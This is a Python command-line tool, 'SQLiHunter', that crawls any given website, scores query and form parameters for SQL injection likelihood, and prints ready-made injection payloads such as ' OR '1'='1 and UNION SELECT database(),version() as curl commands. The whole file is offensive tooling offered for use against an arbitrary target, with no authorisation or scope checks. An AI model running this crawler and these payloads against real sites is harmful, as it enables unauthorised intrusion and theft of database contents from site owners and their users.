#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
from collections import deque
import re
import time

class SQLiHunter:
    def __init__(self, target_url, max_depth=4, delay=0.3):
        self.target_url = target_url
        self.max_depth = max_depth
        self.delay = delay
        self.visited = set()
        self.sqli_candidates = []  # (url, params, score)
        self.base_domain = urlparse(target_url).netloc
        
        # SQLi-prone parameter patterns (high to low priority)
        self.sqli_params = {
            # Numeric IDs (highest risk)
            r'(id|user|uid|pid|cid|gid|aid|tid|nid|sid)',
            # Page/Category/Product (high risk)
            r'(page|cat|category|prod|product|section|view|item)',
            # Common dynamic params
            r'(article|news|story|post|blog|entry|topic)',
            # Search/Query
            r'(search|q|s|query|term|keyword)',
            # Other common
            r'(file|path|dir|name|title|slug)'
        }
        
        # SQLi-prone file patterns
        self.sqli_files = [
            r'\.php(\?.*)?$',  # PHP files with params
            r'(id|user|admin|login|page|cat)\.php',
            r'index\.php(\?.*)?$',
            r'(show|view|detail)\.php',
            r'\.(asp|aspx)(\?.*)?$'
        ]
    
    def is_same_domain(self, url):
        return urlparse(url).netloc == self.base_domain
    
    def score_sqli_param(self, param_name):
        """Score parameters based on SQLi likelihood (0-100)"""
        param_lower = param_name.lower()
        score = 0
        
        # Exact high-risk matches
        high_risk = ['id', 'user', 'uid', 'pid', 'cat', 'page']
        if param_lower in high_risk:
            return 95
        
        # Regex pattern matching
        for pattern in self.sqli_params:
            if re.search(pattern, param_lower, re.IGNORECASE):
                score += 70
        
        # Common suffixes/prefixes
        if re.search(r'(id|cat|page|user)', param_lower):
            score += 25
        
        return max(score, 10)  # Minimum score for any param
    
    def is_sqli_candidate(self, url, params):
        """Check if URL+params combo is SQLi candidate"""
        parsed = urlparse(url)
        path_lower = parsed.path.lower()
        
        # File type check
        for pattern in self.sqli_files:
            if re.search(pattern, path_lower):
                return True
        
        # Has vulnerable params?
        for param in params:
            if self.score_sqli_param(param) > 50:
                return True
        
        return False
    
    def crawl_and_hunt(self, url, depth=0):
        """Crawl and hunt for SQLi candidates"""
        if depth > self.max_depth or url in self.visited:
            return
        
        self.visited.add(url)
        print(f"[*] [{depth}] {url}")
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            resp = requests.get(url, headers=headers, timeout=8)
            resp.raise_for_status()
            
            # Parse current URL for params
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if params and self.is_sqli_candidate(url, params.keys()):
                score = sum(self.score_sqli_param(p) for p in params.keys()) / len(params)
                self.sqli_candidates.append((url, list(params.keys()), score))
                print(f"  🎯 SQLi CANDIDATE (Score: {score:.1f}): {list(params.keys())}")
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Extract all links
            links = set()
            for tag in soup.find_all(['a', 'link', 'area'], href=True):
                link = urljoin(url, tag['href'])
                if self.is_same_domain(link) and link not in self.visited:
                    links.add(link)
            
            # Follow forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                form_url = urljoin(url, action)
                if self.is_same_domain(form_url):
                    links.add(form_url)
                
                # Check form inputs for SQLi params
                inputs = [inp.get('name', '') for inp in form.find_all('input')]
                for inp_name in inputs:
                    if inp_name and self.score_sqli_param(inp_name) > 60:
                        print(f"  🔍 FORM SQLi INPUT: {inp_name}")
            
            # Crawl links (limit to prevent explosion)
            for link in sorted(links)[:30]:
                time.sleep(self.delay)
                self.crawl_and_hunt(link, depth + 1)
                
        except Exception as e:
            print(f"  [-] Error: {e}")
    
    def generate_payloads(self, url, params):
        """Generate basic SQLi payloads for testing"""
        payloads = []
        parsed = urlparse(url)
        
        for param in params:
            # Classic payloads
            payloads.extend([
                f"{parsed.path}?{param}=1' OR '1'='1",
                f"{parsed.path}?{param}=1 AND 1=1--",
                f"{parsed.path}?{param}=1' UNION SELECT 1,2,3--",
                f"{parsed.path}?{param}=-1' UNION SELECT NULL,database(),version()--"
            ])
        
        return payloads
    
    def report(self):
        """Detailed SQLi candidate report"""
        print("\n" + "█"*80)
        print("                    SQLI HUNTER REPORT")
        print("█"*80)
        
        print(f"\n[+] Target: {self.target_url}")
        print(f"[+] URLs visited: {len(self.visited):,}")
        print(f"[+] SQLi Candidates: {len(self.sqli_candidates)}")
        
        if not self.sqli_candidates:
            print("\n❌ No SQLi candidates found")
            return
        
        print("\n🔥 HIGH PRIORITY SQLi CANDIDATES (Score > 80):")
        print("-" * 80)
        high_priority = [c for c in self.sqli_candidates if c[2] > 80]
        
        for url, params, score in sorted(high_priority, key=lambda x: x[2], reverse=True):
            print(f"\n[{score:.1f}] {url}")
            print(f"    Params: {', '.join(params)}")
            
            # Generate payloads
            payloads = self.generate_payloads(url, params)
            print(f"    Payloads:")
            for payload in payloads[:3]:  # First 3 payloads
                print(f"      curl '{payload}'")
        
        print(f"\n📋 ALL CANDIDATES ({len(self.sqli_candidates)}):")
        print("-" * 40)
        for url, params, score in sorted(self.sqli_candidates, key=lambda x: x[2], reverse=True):
            print(f"[{score:.0f}] {url} -> {', '.join(params[:3])}")

def main():
    parser = argparse.ArgumentParser(description='SQLi Parameter Hunter')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=4, help='Max depth')
    parser.add_argument('--delay', type=float, default=0.3, help='Delay between requests')
    parser.add_argument('-o', '--output', help='Save results to file')
    
    args = parser.parse_args()
    
    hunter = SQLiHunter(args.target, args.depth, args.delay)
    hunter.crawl_and_hunt(args.target)
    hunter.report()
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(f"SQLi Candidates - {args.target}\n")
            f.write("="*60 + "\n")
            for url, params, score in sorted(hunter.sqli_candidates, key=lambda x: x[2], reverse=True):
                f.write(f"\n[{score:.1f}] {url}\n")
                f.write(f"Params: {', '.join(params)}\n")
        print(f"\n[+] Saved to {args.output}")

if __name__ == "__main__":
    main()
